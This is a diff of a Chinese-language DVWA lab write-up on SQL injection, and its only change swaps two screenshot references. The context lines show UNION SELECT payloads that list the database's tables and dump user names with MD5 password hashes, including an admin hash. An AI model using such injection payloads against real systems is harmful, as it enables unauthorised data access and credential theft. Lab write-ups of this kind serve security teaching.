@@ -60,7 +60,7 @@ text
 1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'#
 得到表：guestbook, users。
 
-![字段](screenshots/7.png)
+![字段](screenshots/9.png)
 
 5. 获取 users 表的列名
 text
@@ -73,7 +73,7 @@ text
 text
 1' UNION SELECT user, password FROM users#
 
-![字段](screenshots/9.png)
+![字段](screenshots/7.png)
 
 user	password (MD5)
 admin	5f4dcc3b5aa765d61d8327deb882cf99
